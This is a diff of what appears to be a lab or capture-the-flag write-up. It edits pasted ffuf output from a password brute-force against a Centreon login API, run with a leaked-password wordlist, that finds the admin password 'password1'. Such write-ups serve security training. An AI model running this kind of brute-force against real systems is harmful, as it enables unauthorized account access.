@@ -30,17 +30,8 @@ ________________________________________________
  :: Method           : POST
  :: URL              : http://10.10.10.157/centreon/api/index.php?action=authenticate
  :: Wordlist         : FUZZ: /home/soliman/wordlists/darkweb2017_top-1000.txt
- :: Header           : Accept-Language: en-US,en;q=0.5
- :: Header           : Accept-Encoding: gzip, deflate, br
- :: Header           : Referer: http://10.10.10.157/monitoring/
- :: Header           : Cookie: PHPSESSID=j911vsfkqqhaneih1orsj8uikt
- :: Header           : Priority: u=0, i
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
- :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
- :: Header           : Connection: close
- :: Header           : Upgrade-Insecure-Requests: 1
  :: Header           : Host: 10.10.10.157
+ :: Header           : Content-Type: application/x-www-form-urlencoded
  :: Data             : username=admin&password=FUZZ
  :: Follow redirects : false
  :: Calibration      : false
@@ -50,8 +41,8 @@ ________________________________________________
  :: Filter           : Response status: 403
 ________________________________________________
 
-password1               [Status: 200, Size: 60, Words: 1, Lines: 1, Duration: 160ms]
-:: Progress: [999/999] :: Job [1/1] :: 213 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+password1               [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 1015ms]
+:: Progress: [999/999] :: Job [1/1] :: 346 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
 soliman@Legion:~/wordlists$
 ```
 
